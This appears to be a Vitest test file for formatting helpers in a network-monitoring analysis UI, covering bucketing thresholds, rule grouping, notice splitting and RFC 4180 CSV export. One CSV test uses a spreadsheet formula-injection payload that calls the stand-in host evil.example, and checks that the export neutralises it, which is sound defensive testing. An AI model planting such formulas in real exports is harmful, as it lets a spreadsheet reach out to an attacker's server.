// SPDX-License-Identifier: AGPL-3.0-only
import { describe, expect, it } from 'vitest';
import {
  MAX_FINDINGS,
  capacityBucket,
  correlationDirection,
  countDetailValues,
  countNodes,
  detailNum,
  detailStr,
  eventRuleName,
  flapBucket,
  groupByRule,
  humanDays,
  maxDetail,
  peerCountOf,
  ppBucket,
  ratioBucket,
  shareBucket,
  scanPattern,
  sevOf,
  splitNotices,
  sumDetail,
  toCsv,
  totalLabel,
} from './format';
import type { AnalysisFinding } from '../../types/api';

function f(over: Partial<AnalysisFinding> = {}): AnalysisFinding {
  return {
    id: Math.random().toString(36).slice(2),
    score: 80,
    severity: 'warn',
    node_id: 'n1',
    node_name: 'edge-1',
    metric: 'icmp_rtt_ms',
    kind: 'spike',
    when_label: '1h ago',
    duration: 'ongoing',
    detail: {},
    ...over,
  };
}

describe('detail readers', () => {
  it('accept only finite numbers and non-empty strings', () => {
    const row = f({ detail: { a: 1, b: 'x', c: NaN, d: Infinity, e: '', g: null } });
    expect(detailNum(row, 'a')).toBe(1);
    expect(detailNum(row, 'c')).toBeUndefined(); // NaN is not a usable value
    expect(detailNum(row, 'd')).toBeUndefined(); // nor is Infinity
    expect(detailNum(row, 'missing')).toBeUndefined();
    expect(detailStr(row, 'b')).toBe('x');
    expect(detailStr(row, 'e')).toBeUndefined(); // empty string is as good as absent
    expect(detailStr(row, 'g')).toBeUndefined();
  });

  it('aggregate across findings without throwing on absent fields', () => {
    const rows = [f({ detail: { n: 2 } }), f({ detail: {} }), f({ detail: { n: 5 } })];
    expect(sumDetail(rows, 'n')).toBe(7);
    expect(maxDetail(rows, 'n')).toBe(5);
    expect(maxDetail(rows, 'nope')).toBeUndefined();
    expect(sumDetail([], 'n')).toBe(0);
  });

  it('counts distinct entities for tools whose entity is not the node', () => {
    const rows = [
      f({ node_id: 'a', detail: { src: '10.0.0.1' } }),
      f({ node_id: 'a', detail: { src: '10.0.0.2' } }),
      f({ node_id: null, detail: { src: '10.0.0.1' } }),
    ];
    // Three findings, two distinct sources, one distinct node — the flow_scan shape exactly.
    expect(countDetailValues(rows, 'src')).toBe(2);
    expect(countNodes(rows)).toBe(1);
  });
});

describe('severity + totals', () => {
  it('narrows an unknown severity to info', () => {
    expect(sevOf(f({ severity: 'crit' }))).toBe('crit');
    expect(sevOf(f({ severity: 'bogus' as never }))).toBe('info');
  });

  it('renders a truncated result set as a floor, not a count', () => {
    // The backend caps at MAX_FINDINGS, so "60" would claim precision it doesn't have.
    expect(totalLabel([])).toBe('0');
    expect(totalLabel(Array.from({ length: 5 }, () => f()))).toBe('5');
    expect(totalLabel(Array.from({ length: MAX_FINDINGS }, () => f()))).toBe(`${MAX_FINDINGS}+`);
  });
});

describe('bucketing helpers match the backend', () => {
  it('treats r = 0 as co-rising, like Rust `r >= 0.0`', () => {
    expect(correlationDirection(0)).toBe('coRising');
    expect(correlationDirection(0.9)).toBe('coRising');
    expect(correlationDirection(-0.0001)).toBe('inverse');
  });

  it('buckets capacity on the 30/90-day boundaries inclusively', () => {
    expect(capacityBucket(30)).toBe('soon');
    expect(capacityBucket(30.1)).toBe('mid');
    expect(capacityBucket(90)).toBe('mid');
    expect(capacityBucket(91)).toBe('far');
  });

  it('calls one flap per hour chronic', () => {
    expect(flapBucket(1)).toBe('chronic');
    expect(flapBucket(0.99)).toBe('intermittent');
  });

  it('classifies scan shape like Rust, resolving the tie to horizontal', () => {
    expect(scanPattern(4496, 20)).toBe('horizontal'); // sweep: many hosts, one service
    expect(scanPattern(20, 85)).toBe('vertical'); // probe: few hosts, many ports
    // The backend uses `>=`, so an equal count is horizontal on both sides. If this ever disagreed,
    // the UI badge would contradict the engine's own scoring.
    expect(scanPattern(50, 50)).toBe('horizontal');
  });
});

describe('humanDays', () => {
  it('returns a magnitude plus a unit key so JA can localize it', () => {
    expect(humanDays(0.5)).toEqual({ count: 12, unit: 'h' });
    expect(humanDays(1)).toEqual({ count: 1, unit: 'd' });
    expect(humanDays(45)).toEqual({ count: 45, unit: 'd' });
    expect(humanDays(150)).toEqual({ count: 5, unit: 'mo' });
  });

  it('degrades safely on nonsense input', () => {
    expect(humanDays(NaN)).toEqual({ count: 0, unit: 'd' });
    expect(humanDays(-5)).toEqual({ count: 0, unit: 'd' });
  });
});

describe('event_flap rule grouping', () => {
  it('strips the backend metric prefix to get the rule name', () => {
    expect(eventRuleName('event:linkDown storm')).toBe('linkDown storm');
    expect(eventRuleName('icmp_rtt_ms')).toBe('icmp_rtt_ms');
  });

  it('rolls a rule up across nodes, answering "which rule is thrashing?"', () => {
    const rows = [
      f({
        score: 80,
        node_id: 'n1',
        metric: 'event:linkDown',
        detail: { rule_id: 'r1', fires: 6, clears: 5, cycles: 5, per_hour: 1.2 },
      }),
      f({
        score: 92,
        node_id: 'n2',
        metric: 'event:linkDown',
        detail: { rule_id: 'r1', fires: 4, clears: 4, cycles: 4, per_hour: 2.5 },
      }),
      f({
        score: 60,
        node_id: 'n3',
        metric: 'event:bgpDown',
        detail: { rule_id: 'r2', fires: 2, clears: 2, cycles: 2, per_hour: 0.4 },
      }),
    ];
    const groups = groupByRule(rows);
    expect(groups).toHaveLength(2);
    // Ordered by total cycles, so the fleet-wide worst rule leads.
    expect(groups[0].ruleName).toBe('linkDown');
    expect(groups[0].nodes).toBe(2);
    expect(groups[0].cycles).toBe(9);
    expect(groups[0].fires).toBe(10);
    expect(groups[0].worstPerHour).toBe(2.5); // the worst single node, not a sum
    expect(groups[0].score).toBe(92); // the worst finding drives the group
    expect(groups[1].ruleName).toBe('bgpDown');
  });

  it('groups by rule name when the id is missing, and ignores null node ids in the node count', () => {
    const rows = [
      f({ node_id: null, metric: 'event:x', detail: { fires: 1, clears: 1, cycles: 1 } }),
      f({ node_id: null, metric: 'event:x', detail: { fires: 1, clears: 1, cycles: 1 } }),
    ];
    const [g] = groupByRule(rows);
    expect(g.key).toBe('x');
    expect(g.cycles).toBe(2);
    expect(g.nodes).toBe(0);
  });

  it('returns nothing for no findings', () => {
    expect(groupByRule([])).toEqual([]);
  });
});

describe('toCsv', () => {
  it('quotes every field and doubles embedded quotes (RFC 4180)', () => {
    const csv = toCsv(
      [
        { header: 'node', cell: (x) => x.node_name },
        { header: 'note', cell: () => 'say "hi"' },
      ],
      [f({ node_name: 'edge,1' })],
    );
    const [head, row] = csv.split('\r\n');
    expect(head).toBe('"node","note"');
    // The comma inside a quoted field must not split the column.
    expect(row).toBe('"edge,1","say ""hi"""');
  });

  it('emits a header even with no rows', () => {
    expect(toCsv([{ header: 'a', cell: () => 'x' }], [])).toBe('"a"');
  });

  it('neutralizes a device-supplied cell that a spreadsheet would execute', () => {
    // These columns carry strings the device wrote (sysName, a syslog signature), which are
    // untrusted input. `csvField`'s own rules are tested in `lib/csv.test.ts`; what this pins is
    // that the export path goes through it — a local copy reappearing here is the original bug.
    const csv = toCsv(
      [{ header: 'node', cell: (x) => x.node_name }],
      [f({ node_name: '=WEBSERVICE("http://evil.example")' })],
    );
    expect(csv.split('\r\n')[1]).toBe('"\'=WEBSERVICE(""http://evil.example"")"');
  });

  it('leaves a negative measurement numeric', () => {
    // Deliberate: `r` is negative for every inverse correlation, so prefixing it would make the
    // column text for half its rows and numeric for the other half.
    const csv = toCsv([{ header: 'r', cell: () => '-0.87' }], [f()]);
    expect(csv.split('\r\n')[1]).toBe('"-0.87"');
  });
});

describe('ratioBucket', () => {
  it('bands a ratio at the documented thresholds, inclusive', () => {
    // The boundaries are the whole point: 3× and 10× are "at least", not "more than".
    expect(ratioBucket(10)).toBe('x10');
    expect(ratioBucket(10.1)).toBe('x10');
    expect(ratioBucket(9.99)).toBe('x3');
    expect(ratioBucket(3)).toBe('x3');
    expect(ratioBucket(2.99)).toBe('low');
    expect(ratioBucket(0)).toBe('low');
  });

  it('treats a negative ratio as low rather than banding it', () => {
    expect(ratioBucket(-5)).toBe('low');
  });
});

describe('the two-tier filter buckets', () => {
  // Both moved here from the `.tsx` bodies that defined them, where nothing ran them. The
  // boundaries are the whole content of these functions: they are the filter chips an operator
  // narrows a report with, so an off-by-one puts a row under the wrong chip and it simply looks
  // like the report found less.
  it('calls a conversation carrying 80% of a node high, inclusively', () => {
    expect(shareBucket(0.8)).toBe('high');
    expect(shareBucket(0.7999)).toBe('mid');
    expect(shareBucket(1)).toBe('high');
    expect(shareBucket(0)).toBe('mid');
  });

  it('calls a 30-point severity shift big, inclusively', () => {
    expect(ppBucket(30)).toBe('big');
    expect(ppBucket(29.9)).toBe('mid');
    // A shift downward is still `mid`: this axis asks "how much did it move up", and the report
    // only carries rows the backend already decided moved the wrong way.
    expect(ppBucket(-40)).toBe('mid');
  });
});

describe('splitNotices', () => {
  it('keeps notices out of the findings a report body renders', () => {
    // A body assumes it never sees a notice row; one leaking through renders as a finding with no
    // metric and no severity.
    const rows = [
      { kind: 'anomaly', id: 1 },
      { kind: 'info', id: 2 },
      { kind: 'capacity', id: 3 },
      { kind: 'info', id: 4 },
    ];
    const { findings, notices } = splitNotices(rows);
    expect(findings.map((f) => f.id)).toEqual([1, 3]);
    expect(notices.map((f) => f.id)).toEqual([2, 4]);
  });

  it('partitions completely — every row lands on exactly one side', () => {
    const rows = [{ kind: 'a' }, { kind: 'info' }, { kind: 'b' }];
    const { findings, notices } = splitNotices(rows);
    expect(findings.length + notices.length).toBe(rows.length);
  });

  it('handles an empty result set', () => {
    expect(splitNotices([])).toEqual({ findings: [], notices: [] });
  });
});

describe('peerCountOf', () => {
  // Additive payload: a finding written before the neighbour expansion has no `peer_count` at all,
  // and 0 is exactly what its absence meant. It must never read as "unknown" or throw.
  it('answers zero for a finding from before the expansion', () => {
    expect(peerCountOf({})).toBe(0);
    expect(peerCountOf({ detail: null })).toBe(0);
    expect(peerCountOf({ detail: { timeline: [] } })).toBe(0);
  });

  it('reads a real peer count and rejects nonsense', () => {
    expect(peerCountOf({ detail: { peer_count: 2 } })).toBe(2);
    expect(peerCountOf({ detail: { peer_count: 0 } })).toBe(0);
    expect(peerCountOf({ detail: { peer_count: -1 } })).toBe(0);
    expect(peerCountOf({ detail: { peer_count: 'two' } })).toBe(0);
    expect(peerCountOf({ detail: { peer_count: Number.NaN } })).toBe(0);
  });
});
